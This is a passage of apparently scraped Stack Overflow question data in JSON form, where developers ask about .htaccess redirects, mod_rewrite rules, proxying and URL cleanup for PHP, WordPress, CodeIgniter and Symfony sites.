<code>http://www.domain2.com/sdssds?%dfdf</code></p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12816848,"title":"htaccess Redirect page","body":"<p>Is it possible to do a redirect (->) in de .htaccess-file, the following way? : </p>\n\n<pre><code>www.website.com/home -&gt; www.website.com/somepage/home\nwww.website.com/contact -&gt; www.website.com/somepage/contact\nwww.website.com/blog -&gt; www.website.com/somepage/blog\n</code></pre>\n\n<p>Thanks in advance,</p>\n\n<p>Aäron</p>\n"},{"tags":["linux","flash","apache",".htaccess","file-permissions"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12794809,"title":"Block visitors access to .xml files but allow flash to open them","body":"<p>I want to deny permission of visitors to access <a href=\"http://example.com/xml_folder/xml_file1.xml\" rel=\"nofollow\">http://example.com/xml_folder/xml_file1.xml</a> and any other .xml file in the xml_folder. I can do that easily modifying folder permisions.\nThe problem is that I also have a small flash on my website that needs to access those .xml files and once I remove \"read\" from \"Public permissions\" the flash can't access the files either (which I think is pretty normal).</p>\n\n<p>So .. my question is: how do I restrict visitors to access the .xml files but not the flash.swf file ?\nBtw, it's running on a linux vps.</p>\n"},{"tags":["html",".htaccess","url","redirect","web"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":12670703,"title":"htaccess redirect when there is a space in url","body":"<p>I want to redirect from a old url which still appears in the google search to the new one. the old url is this:</p>\n\n<pre><code>http://www.marionettecolla.org/file%20_mostra_milano/mostra_marionette-milano.htm\n</code></pre>\n\n<p>and I want to redirect it to the home page:</p>\n\n<pre><code>http://www.marionettecolla.org/\n</code></pre>\n\n<p>I used this in my .htaccess:</p>\n\n<pre><code>Redirect http://marionettecolla.org/file\\ _mostra_milano/mostra_marionette-milano.htm http://marionettecolla.org/\n</code></pre>\n\n<p>but I am getting Error 500... Does anybody know how to solve this problem?</p>\n"},{"tags":[".htaccess","url","redirect","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":28,"score":0,"question_id":12677475,"title":"Remove word/directory from URL using .htaccess","body":"<p>Currently my single page URL looks like this:</p>\n\n<pre><code>http://website.com/post/6268/some-post-title\n</code></pre>\n\n<p>The post number and title are being generated using PHP. What I want to do is to remove the following part form the URL:</p>\n\n<pre><code>/post/6268/\n</code></pre>\n\n<p>so that it looks like this:</p>\n\n<pre><code>http://website.com/some-post-title\n</code></pre>\n\n<p>What I tried to do was to add the following line into the .htaccess file however it does not work:</p>\n\n<pre><code>RewriteRule ^post/(.*)/(.*)$ /$1\n</code></pre>\n\n<p>I have reviewed many questions here as well as some other forum topics I found but I was unable to find a solution on this.</p>\n\n<p>The line in the .htaccess file actually states:</p>\n\n<pre><code>RewriteRule ^post/(.*)/(.*)$ view.php?pid=$1\n</code></pre>\n"},{"tags":["php","apache",".htaccess"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":564,"score":2,"question_id":2692298,"title":"How to turn dynamic URL into static URL","body":"<p>I am developing a website using PHP and Apache.\nI wanna turn my URLs from </p>\n\n<p><strong>www.example.com/book.php?book=title</strong></p>\n\n<p>into something like this, if it is possible of course:</p>\n\n<p><strong>www.example.com/book/title</strong></p>\n\n<p>Notice that the title of the books are unique and cannot be repeated.</p>\n\n<p>I`ve read about this, but none of the posts were clear enough for a beginner like me.\nDo you guys know any tutorial that explains that?</p>\n\n<p>Thanks.</p>\n"},{"tags":["wordpress",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":12808213,"title":"Wordpress in sub directory htaccess overriding main site and redirecting to blog","body":"<p>My wordpress install's (multiple blogs) are for some reason overriding my htaccess in the root when I try to canonicalize the url,</p>\n\n<p>I have:</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{HTTP_HOST} ^mysite.com\nRewriteRule (.*) http://www.mysite.com/$1 [R=301,L]\n</code></pre>\n\n<p>visiting <code>http://www.mysite.com</code> workings fine but <code>http://mysite.com</code> is redirecting to the wordpress blog <code>http://www.mysite.com/blog</code></p>\n\n<p>I have a base e-commerce site on the root and two wordpress blogs in subdirectories</p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12808506,"title":"Can ProxyPass and ProxyPassReverse work in htaccess?","body":"<p>I've never set up a proxy before. I'm using shared hosting, so to set Apache directives, I need to use .htaccess. Can I use .htaccess to do something like below? Any limitations?</p>\n\n<pre><code>ProxyRequests Off\nProxyPass /img/ http://internal.example.com/img/\nProxyPass /app/ http://internal.example.com/app/\n\nProxyPassReverse / http://internal.example.com/\n</code></pre>\n"},{"tags":["apache",".htaccess","ssl","https"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":49,"score":2,"question_id":12810989,"title":".htaccess for appending https://www","body":"<p>I have searched for quite sometime to get a solution or a hint to my query but didnt find anything valuable. Basically i have my application which is SSL secured. All i want is that </p>\n\n<ol>\n<li><p>If users try to open the application without https and www, it should automatically append \"<code>https://www</code>\"</p></li>\n<li><p>If user enters \"<code>https://mydomain.com</code>\", it should change to \"<code>https://www.mydomain.com</code>\"</p></li>\n<li><p>If user enters \"<code>www.mydomain.com</code>\", it should change to \"<code>https://www.mydomain.com</code>\"</p></li>\n</ol>\n\n<p>I understand this can be achieved through .htaccess but i am a lot ignorant about the way these files are written.</p>\n\n<p>Any help will be highly appreciated.</p>\n"},{"tags":["php","linux",".htaccess","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":52,"score":0,"question_id":12805241,"title":"What wrong with my .htaccess file so that it can work on linux?","body":"<p>I have a project in codeigniter and I have an .htaccess file I used to hide index.php page from users. On local machine it is when the project is in windows OS, but when I test in linux( ubuntu distribution) the .htaccess features do not work. Any suggestion for what I can do for linux is really appreciated.\nMy .htaccess file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n\n    RewriteEngine On\n    RewriteBase /myproject/\n\n    ### Canonicalize codeigniter URLs\n\n    # If your default controller is something other than\n    # \"welcome\" you should probably change this\n    RewriteRule ^(platform(/index)?)/?$ / [L,R=301]\n    RewriteRule ^(.*)/index/?$ $1 [L,R=301]\n\n    # Removes trailing slashes (prevents SEO duplicate content issues)\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.+)/$ $1 [L,R=301]\n\n    # Enforce www\n    # If you have subdomains, you can add them to\n    # the list using the \"|\" (OR) regex operator\n   RewriteCond %{HTTP_HOST} !^(localhost|myproject) [NC]\n   RewriteRule ^(.*)$ http://localhost/myproject/$1 [L,R=301]\n\n\n\n    # Removes access to the system folder by users.\n    # Additionally this will allow you to create a System.php controller,\n    # previously this would not have been possible.\n    # 'system' can be replaced if you have renamed your system folder.\n    RewriteCond %{REQUEST_URI} ^system.*\n    RewriteRule ^(.*)$ /index.php/$1 [L]\n\n    # Checks to see if the user is attempting to access a valid file,\n    # such as an image or css document, if this isn't true it sends the\n    # request to index.php\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule ^(.*)$ index.php/$1 [L]\n\n&lt;/IfModule&gt;\n\n&lt;IfModule !mod_rewrite.c&gt;\n\n    # Without mod_rewrite, route 404's to the front controller\n    ErrorDocument 404 /index.php\n\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["wordpress",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12810307,"title":"htaccess Remove Query String on Redirect","body":"<p>I've researched this for awhile now and swear my solution should work according to the following (and hundreds of others here so forgive my duplication): </p>\n\n<p><a href=\"http://stackoverflow.com/questions/3457022/mod-rewrite-remove-query-string-from-url\">Example 1</a>\n<a href=\"http://wordpress.org/support/topic/301-redirect-old-site-dynamic-urls-to-wordpress-permalinks\" rel=\"nofollow\">Example 2</a></p>\n\n<p>I need to remove the query string from a redirect. Old WordPress ?p=### to a new domain/url.</p>\n\n<pre><code>Old Url: blog.domain.com/blog/?p=123\nNew Url: www.domain.com/yada/woohoo/\n</code></pre>\n\n<p>With this:</p>\n\n<pre><code>RewriteCond %{QUERY_STRING} ^p=123$\nRewriteRule ^/blog/$ http://www.domain.com/yada/woohoo/?  [L,R=301]\n</code></pre>\n\n<p>I get: <a href=\"http://www.domain.com/yada/woohoo/?p=123\" rel=\"nofollow\">http://www.domain.com/yada/woohoo/?p=123</a></p>\n\n<p>I want: <a href=\"http://www.domain.com/yada/woohoo/\" rel=\"nofollow\">http://www.domain.com/yada/woohoo/</a></p>\n\n<p>blog.domain.com will be redirected at the DNS level.</p>\n\n<p>What am I missing? The \"?\" at the end of the rewrite line should remove the query string?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12799681,"title":"Trying to redirect all subdirectory requests to root but it doesn't work at all","body":"<p>I want to redirect all /wordpress/ requests to the same address at root.</p>\n\n<p>For example:\n/wordpress/foo -> /foo</p>\n\n<p>I tried this answer I found by adding it to the .htaccess file:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteRule ^wordpress/.*$ / [R=302]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>but needless to say, it just redirects the direct request to /wordpress/ to /.</p>\n\n<p>e.g. a request to /wordpress/foo/ will still be treated as /wordpress/foo/.</p>\n\n<p>I tried everything I found but nothing works.</p>\n\n<p>website address is <a href=\"http://www.ist118.com/\" rel=\"nofollow\">http://www.ist118.com/</a></p>\n\n<p>an example address that doesn't redirect correctly is <a href=\"http://www.ist118.com/wordpress/%D8%A8%D9%87%D8%AA%D8%B1%DB%8C%D9%86-%D8%B1%D8%A7%D9%87%D9%86%D9%85%D8%A7%DB%8C-%D8%AE%D8%B1%DB%8C%D8%AF-%D8%A7%D8%B2-%D8%A7%D8%B3%D8%AA%D8%A7%D9%86%D8%A8%D9%88%D9%84/%D9%82%DB%8C%D9%85%D8%AA-%D8%AE%D9%88%D8%B1%D8%A7%DA%A9%DB%8C-%D9%87%D8%A7-%D8%AF%D8%B1-%D8%A7%D8%B3%D8%AA%D8%A7%D9%86%D8%A8%D9%88%D9%84/\" rel=\"nofollow\">http://www.ist118.com/wordpress/%D8%A8%D9%87%D8%AA%D8%B1%DB%8C%D9%86-%D8%B1%D8%A7%D9%87%D9%86%D9%85%D8%A7%DB%8C-%D8%AE%D8%B1%DB%8C%D8%AF-%D8%A7%D8%B2-%D8%A7%D8%B3%D8%AA%D8%A7%D9%86%D8%A8%D9%88%D9%84/%D9%82%DB%8C%D9%85%D8%AA-%D8%AE%D9%88%D8%B1%D8%A7%DA%A9%DB%8C-%D9%87%D8%A7-%D8%AF%D8%B1-%D8%A7%D8%B3%D8%AA%D8%A7%D9%86%D8%A8%D9%88%D9%84/</a></p>\n\n<p>(url is encoded because of utf8 arabic characters)</p>\n\n<p>Complete .htaccess contents:</p>\n\n<pre><code>RewriteOptions inherit\n\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteRule /wordpress/(.*) /$1 [PT]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":["regex","apache",".htaccess","mod-rewrite","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12801246,"title":"Transparent redirect to port 8080","body":"<p>I have a few web applications available on my server on port 8080.</p>\n\n<p>As some of my users can't reach port 8080 due to their firewall, I'd like to set a redirection on my apache server. Il would like the following URL</p>\n\n<pre><code>http://dev2.test.com/tomcat/somewebapp/restofthepath\n</code></pre>\n\n<p>to display what is accessible at</p>\n\n<pre><code>http://dev2.test.com:8080/somewebapp/restofthepath\n</code></pre>\n\n<p>Of course I don't want users typing the first address to see the second one.</p>\n\n<p>I added the following <code>.htaccess</code> file in <code>/var/www</code> :</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_URI} ^/(tomcat)\nRewriteRule ^/tomcat/(.*)$ http://dev2.test.com:8080/$1 [P,QSA,L]\n</code></pre>\n\n<p>But I get this error in <code>/var/log/apache2/error.log</code> :</p>\n\n<pre><code>[Tue Oct 09 15:23:06 2012] [error] File does not exist:  proxy:http://dev2.test.com:8080/tomcat/\n</code></pre>\n\n<p>Could you please tell me what I should do ?</p>\n"},{"tags":["regex","apache",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":12799672,"title":"htaccess rewrite rules to match dynamic params","body":"<p>My base url looks like this.</p>\n\n<pre><code>http://localhost/test/s/beer-drinks\n</code></pre>\n\n<p>And depending on the users input it can be something like this.</p>\n\n<pre><code>http://localhost/test/s/beer-New-York-drinks_alcoholic-No_rating-2-3_price-1-3_page-2   \n</code></pre>\n\n<p>The part where it says \"beer\" can be any string which is the actual search string the user inputs.</p>\n\n<p>The part where it says \"New-York\" can be any city and the user has an option of setting or not setting it.</p>\n\n<p>The user also has the option of setting or not setting values for the following.\n   alcoholic can have a value of No or Yes\n   rating can either be a value from 1 to 5 and multiple values are separated by a -\n   price can either be a value from 1 to 5 and multiple values are separated by a -\n   page is a number indicating the offset for pagination</p>\n\n<p>I wanted to direct the url above and be able to pass the values for the actual search string (\"beer\"), neglect the match for the city and pass the values for alcoholic, rating, price and page if the are set.</p>\n\n<p>I have something like this on my htaccess</p>\n\n<pre><code>RewriteRule ^search$ s/ [R=301,L]\nRewriteRule ^search/$ s/ [R=301,L]\n\nRewriteRule ^s/(.*)-drinks_alcoholic-(.*)_rating-(.*)_price-(.*)_page-(.*) search/q_$1/alcoholic_$2/rating_$3/price_$4/page_$5/\n    .\n    .\n    .\nRewriteRule ^s/(.*)-drinks_page-(.*) search/q_$1/page_$2/\nRewriteRule ^s/(.*)-drinks search/q_$1/\n</code></pre>\n\n<p>I am having a hard time matching the city part without breaking the order of the matches ($1, $2, etc).</p>\n\n<p>I found <a href=\"http://www.regular-expressions.info/conditional.html\" rel=\"nofollow\">this article</a> which explains conditionals in regex patterns but i can seem to get it to work specially if page is set.</p>\n"},{"tags":["php",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":62,"score":2,"question_id":12802823,"title":"htaccess rewrite if condition if variable is equal to a certain string","body":"<p>I am using mod rewrite in an .htaccess file to change the URL to a nicer one, it converts this:</p>\n\n<pre><code>http://domain.com?a=test&amp;v=page&amp;id=3\n</code></pre>\n\n<p>to</p>\n\n<pre><code>http://domain.com/test/page/3\n</code></pre>\n\n<p>using this condition</p>\n\n<pre><code>RewriteRule ^([^/\\.]+)/([^/\\.]+)/([^/\\.]+)?$ index.php?a=$1&amp;v=$2&amp;id=$3 [L]\n</code></pre>\n\n<p>I want to do something different if $1 == cart and $2 == home</p>\n\n<p>Here is some pseudo code for the idea using a php <code>if</code> condition</p>\n\n<pre><code>if($1 == 'cart' &amp;&amp; $2 == 'home'){\n   here I want to do a different rewrite rule\n}else{\n   RewriteRule ^([^/\\.]+)/([^/\\.]+)/([^/\\.]+)?$ index.php?a=$1&amp;v=$2&amp;id=$3 [L]\n}\n</code></pre>\n\n<p>Any idea as to how I go about that?</p>\n"},{"tags":[".htaccess","drupal","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":39,"score":1,"question_id":12800542,"title":"Drupal .htaccess rewrite/substitution without redirect","body":"<p>I have a URL as follows: <code>www.site.com/catalog/?type=6</code>  which I need to rewrite to <code>www.site.com/white-wines/white-cases</code>.</p>\n\n<p>What is important is that it is not a redirect, for example the URL should remain as <code>www.site.com/white-wines/white-cases</code> when visited, but show content from <code>www.site.com/catalog/?type=6</code>.</p>\n\n<p>The current solution that I have performs a redirect and I'm struggling to work this out.</p>\n\n<pre><code>RewriteRule ^white-wines/white-cases$ http://www.site.co.uk/catalog/?type=6 [L]\n</code></pre>\n"},{"tags":["php",".htaccess","rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12800966,"title":"Rewrite rule for multiple files and parameters","body":"<p>Currently I got this rewrite rule in my .htaccess to pass the <code>[value]</code> in <code>http://www.site.com/[value]</code> to <code>/page?q=[value]</code></p>\n\n<pre><code>RewriteRule ^([a-zA-Z0-9_-]+)$ page?q=$1\nRewriteRule ^([a-zA-Z0-9_-]+)/$ page?q=$1\n</code></pre>\n\n<p>How can I achive so the following additional rewrites:</p>\n\n<p><code>http://www.site.com/foo/1</code> -> <code>http://www.site.com/page?param=1</code>\n<code>http://www.site.com/bar/1</code> -> <code>http://www.site.com/page?param2=1</code>\n<code>http://www.site.com/baz/1</code> -> <code>http://www.site.com/page2?param=1</code></p>\n"},{"tags":[".htaccess","mod-rewrite","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12601982,"title":"How to re-direct in htaccess?","body":"<p>I need a htaccess file that will do the following :</p>\n\n<ol>\n<li><p>If you visit the domain redirect to a sub-directory</p></li>\n<li><p>However if you visit the index.php from a certain set of internal URL's then show the index.php</p></li>\n</ol>\n\n<p>For example :</p>\n\n<ol>\n<li><p>If you visit www.domain.com then you get redirected to www.domain.com/Welcome/</p></li>\n<li><p>However if you visit www.domain.com / link to the domain from the page www.domain.com/About-Us/ you would NOT get redirected and instead show the index.php (www.domain.com/index.php) would be shown.</p></li>\n</ol>\n"},{"tags":[".htaccess","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":12791507,"title":".htaccess rewrite rule for photos","body":"<p>i have url like this </p>\n\n<pre><code>http://www.example.com/photo?id=196\n</code></pre>\n\n<p>i want to change this to other URL. some thing like that. </p>\n\n<pre><code>http://www.example.com/test-article-by-me\n</code></pre>\n\n<p>\"test article by me\" is TITLE of the article and i want it to show in url. </p>\n\n<p>can anybody guide me how ti achieve this ?\nWaiting to hear from you guys. </p>\n"},{"tags":["php","apache",".htaccess","permissions"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12798306,"title":"Check permission of users for viewing static files in apache server with php?","body":"<p>I have implemented a php website that has some users.\nI want to manage their access to static files. </p>\n\n<p>In addition, I have a function in a file <code>permissions.php</code> that gets a url (e.g. <code>/images/secret.jpg</code>) and checks the it's permission for the current logged in user.</p>\n\n<p>I think I need to add something to .htaccess file that for every request, first call my function in <code>permissions.php</code> then serve the file if it returns true otherwise return 404.</p>\n\n<p>How can I do that?</p>\n"},{"tags":["html5",".htaccess","video","ogg"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12797187,"title":"Getting html5 video to work on my server","body":"<p>First of all sorry for asking something that has been asked many times before but I just cant seem to find the answer to my problem.</p>\n\n<p>I have a site with several html5 videos, everything works locally but not on my server. \nAll the videos are uploaded (in ogv,mp4,webm), the directory path is correct but the videos aren't showing up in any browser.</p>\n\n<p>I have tried adding \"AddType video/ogg .ogv\" etc to my .htaccess file but that does nothing. If i put the .htaccess file anywhere other than the folder where my videos are, I get a page with \"IISPassword The page cannot be displayed\".\nI have added all the required mime types to Cpanel but still nothing.</p>\n\n<p>What am I doing wrong here? Any suggestions?</p>\n\n<p>Update: Videos are now showing up in Chrome but not FF or safari</p>\n"},{"tags":[".htaccess","magento"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12757204,"title":"301 redirect to new URL from htaccess","body":"<p>Needs a favour from your side, I have added following rule in htaccess files not sure why it is not executing can you check and let us know if any issue</p>\n\n<pre><code>Redirect 301 /product/rose-elliot%E2%80%99s-__060727.aspx http://www.website.co.uk/ahhgh.html\n\nRedirect 301 /abc/%20/index.php/customer/account/login/ https://www.website.co.uk/customer/account/login/\n</code></pre>\n"},{"tags":["regex",".htaccess","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":32,"score":3,"question_id":12796562,"title":"Regular expression for htaccess URL redirect","body":"<p>I am trying to redirect all files in a particular directory in my web server.</p>\n\n<p>I am trying regular expressions such as </p>\n\n<pre><code>Redirect /data/january\\/([a-zA-Z0-9]*).([a-zA-Z]*)  http://www.mysite.com/sample \n</code></pre>\n\n<p>The expression <code>/([a-zA-Z0-9]*).([a-zA-Z]*)</code> is trying to find expressions such as <strong>dat35262.pdf</strong>.</p>\n\n<p>But its not working. Can you help me out?</p>\n"},{"tags":[".htaccess","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":12781800,"title":"htaccess: domain hosted on subdirectory","body":"<p>I have a website hosted under www.mydomain.com/myniceweb, and I bought the domain www.myniceweb.com</p>\n\n<p>It works fine, but I don't want the visitors to be able to see the subfolder (www.mydomain.com/myniceweb), and I don't want google to think there are 2 different websites with the same content...</p>\n\n<p>I tried modifying the .htaccess file with no results:</p>\n\n<pre><code>RewriteEngine on\n\nRewriteCond %{HTTP_HOST} ^(www.)?myniceweb.com$\nRewriteCond %{REQUEST_URI} !^/myniceweb/\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)$ /myniceweb/$1\n\nRewriteCond %{HTTP_HOST} ^(www.)?myniceweb.com$\nRewriteRule ^(/)?$ myniceweb/index.php [L]\n</code></pre>\n\n<p>I want to \"redirect\" the users that access www.mydomain.com/myniceweb to www.myniceweb.com How can I do this?</p>\n\n<p>I would be grateful for your help!</p>\n"},{"tags":[".htaccess","redirect","http-redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12795072,"title":"how to redirect example.com with htaccess","body":"<p>how to redirect example.com to example.com/market using .htaccess file</p>\n\n<p>ex.</p>\n\n<pre><code>http://example.com/details.php?id=3667 and\nhttp://www.example.com/details.php?id=3667\n</code></pre>\n\n<p>should redirected to</p>\n\n<pre><code>http://example.com/market/details.php?id=3667\n</code></pre>\n\n<p>and also I want to redirect any example.com to example.com/market</p>\n\n<p>using htaccess</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12794391,"title":".htacces rewrite url is not working","body":"<p>I've been searching for 2 days now and haven't found a complete solution to this problem. </p>\n\n<p>my directories (on localhost):<br>\nroot<br>\n - fons (here is my <strong>htaccess</strong> file located)<br>\n - - functions (some functions)<br>\n - - web (index.php)<br>\n - - docs (index.php)<br>\n - - user (index.php)</p>\n\n<p>I'd like to have when i go to localhost/fons/ , that i see the content of the web map but the url should remain localhost/fons. If i go to localhost/fons/docs/ then i see the docs content , and localhost/fons/user/ -> user content</p>\n\n<p>the .htaccess i've written:  </p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{REQUEST_URI} !^/(fons/user|fons/docs)\nRewriteRule ^$ /fons/web\n</code></pre>\n\n<p>With this htaccess when i go to localhost/fons/ i get redirected to the web-subfolder and the url changes.  </p>\n\n<p>What do i have to change so that the url stays the same, but i see the content of the web folder?  </p>\n\n<p>and if possible, is there a way to ditch the 'fons' in htaccess, so in the future when i create another project with the same structure, i can just copy paste the htaccess and don't need to change it?</p>\n"},{"tags":["apache",".htaccess","geolocation","geoip","cloudflare"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1362,"score":0,"question_id":6470913,"title":"How can I get the user's IP while using both CloudFlare and MaxMind's GeoIP with mod_geoip?","body":"<p>CloudFlare provides the user's country from the originating IP but I need location on a city level so I've added MaxMind's GeoCityLite using the mod_geoip Apache script.</p>\n\n<p>The problem is now to get the IP in a php variable, I'm using something like</p>\n\n<pre><code>$country = apache_note(\"GEOIP_COUNTRY_CODE\");\n</code></pre>\n\n<p>This is great but the IP mod_geoip is using is the CloudFlare DNS, not the end user.  CloudFlare offers the server variable HTTP_CF_CONNECTING_IP to use the end-user IP but how do I use THAT variable/IP in the mod_geoip?</p>\n\n<p>Can this be done with a few lines in htaccess?</p>\n\n<p>Edit: I have a workaround using the php API for geoip which is easy but the benchmarks using the apache lookup of the php api is much much better so I'd rather find this solution.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12787112,"title":"How do I point to a specific directory using mod_rewrite?","body":"<p>Note: I cant use apache \"virtualhosts\" on my server, but I can use mod_rewrite.</p>\n\n<p>I have two domains pointing to the same IP address.</p>\n\n<p>They both go to the directory <code>/public_html/www/</code>.</p>\n\n<p>What is the best way to make the \"home\" directory of one of the domains <code>/public_html/www/somethingelse/</code>?</p>\n"},{"tags":["php",".htaccess","iis","url-rewriting","plesk"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12741467,"title":"URL-rewriting on Plesk using ISAPI_rewrite3 Lite","body":"<p>I am using Plesk Windows based web server with Windows 2008 server OS with IIS-6 for my e-commerce website.</p>\n\n<p>I want to rewrite URLs for all dynamic pages, So I installed ISAPI_Rewrite 3 Lite on my web server also I had uploaded the <code>.htaccess</code> file with the basic rules as follows</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^contact\\.html$ contactus.php? [NC,R]\n</code></pre>\n\n<p>I never worked before with ISAPI neither on URL- rewriting.</p>\n\n<p>My doubt is </p>\n\n<ol>\n<li>How should I proceed after installation</li>\n<li>Should I upload <code>.htaccess</code> or </li>\n<li><code>httpd.conf</code> file OR This s/w has ISAPI_Rewrite Manager which gives place to edit <code>httpd.conf</code>, Should I write rules on this.</li>\n</ol>\n\n<p>Anyways I had tried all these steps but unfortunately I couldn't find any remedies.\nAny immediate solution will be appreciable. </p>\n"},{"tags":[".htaccess","codeigniter","url-rewriting","routing","codeigniter-url"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":60,"score":4,"question_id":12793607,"title":"Routes in Codeigniter","body":"<p>I want to have a clean URL in CodeIgniter based application for User's Profile Information.</p>\n\n<p>Please Take a look at URL formats below.</p>\n\n<pre><code>Actual URL : http://www.mydomain.com/index.php/users/profile/user1\n</code></pre>\n\n<p>I'm expecting users to have Personal URL's like</p>\n\n<pre><code>http://www.mydomain.com/user1\nhttp://www.mydomain.com/user2\nhttp://www.mydomain.com/user3\n</code></pre>\n\n<p>URL <a href=\"http://www.mydomain.com/user1\" rel=\"nofollow\">http://www.mydomain.com/user1</a> should process <a href=\"http://www.mydomain.com/index.php/users/profile/user1\" rel=\"nofollow\">http://www.mydomain.com/index.php/users/profile/user1</a> in background execution.</p>\n\n<p>I will be removing index.php from URL using Route library. </p>\n\n<p>Thanks in advance for any sort of help.</p>\n"},{"tags":["php","apache",".htaccess","symfony2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":111,"score":0,"question_id":12786856,"title":"Rewrite URL using Apache .htaccess","body":"<p>I have configured a remote server with a project I have developed using Symfony2.</p>\n\n<p>As any Symfony2 project, a typical url looks like:</p>\n\n<pre><code>www.domain.com/Symfony/web/app.php/whatever\n</code></pre>\n\n<p>I got to redirect <code>www.domain.com</code> to that URL to make the users directly point to the main page when typing the domain. But, there is still something more to do.</p>\n\n<p>Using .htaccess, how can I rewrite the url to make it look like <code>www.domain/whatever</code> skiping all the <code>/Symfony/web/app.php</code>?</p>\n\n<p>Edited (3):</p>\n\n<p>Ok, I got something (not all of it thoug):</p>\n\n<p>I got to remove the <code>app.php</code> part adding this:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n\n    RewriteCond %{HTTP_HOST} !^www\\.\n    RewriteRule ^(.*)$ http://www.%{HTTP_HOST}/$1 [R=301,L]\n\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteRule ^(.*)$ app.php [QSA,L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>So I have almost done what I wanted: now it works putting <code>http://www.domain.com/Symfony/web/main/user</code>. I got to remove the app.php. From this point, how would I remove also the <code>/Symfony/web</code> part?</p>\n"},{"tags":["php","http",".htaccess","dns"],"answer_count":7,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2225,"score":2,"question_id":6355119,"title":"How to develop a mobile version website, without changing it's domain name?","body":"<p>I want to develop the mobile (also includes iphone,ipad,andriod) version of my original site. But I don't want to create another sub domain like www.m.mydomain.com, can i dynamically change the document root separately for mobile version and the existing one?\nI have also noticed that, when I open facebook form iphone or any andriod mobile it opens with it's original domain name like <a href=\"http://www.facebook.com/\" rel=\"nofollow\">http://www.facebook.com/</a> bt when i open it from any other mobile like nokia or samsung it comes with <a href=\"http://m.facebook.com/\" rel=\"nofollow\">http://m.facebook.com/</a>, what is the difference between this 2?  